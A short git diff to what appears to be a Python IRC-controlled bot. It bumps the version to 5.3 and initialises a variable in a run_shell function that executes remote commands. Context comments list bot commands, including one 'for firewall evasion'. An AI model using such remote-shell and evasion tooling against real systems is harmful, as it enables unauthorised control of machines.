@@ -30,7 +30,7 @@ from modules.logging import logfile, log
 #       status      returns the size of the worker's task queue
 #       openvpn     implement openvpn for firewall evasion
 
-version = "5.2"                                                   # bot version
+version = "5.3"                                                   # bot version
 
 #logfile(filename="bot_v%s.log" % version)                         # redirects bot output to logfile
 
@@ -307,6 +307,7 @@ def full_identify():                                              # give verbose
     privmsg('[√] Done.')
 
 def run_shell(cmd, timeout=60, verbose=False):                    # run a shell command and return the output, verbose enables live command output via yield
+    retcode = None
     signal.signal(signal.SIGALRM, timeout_handler)
     signal.alarm(timeout)
     try:
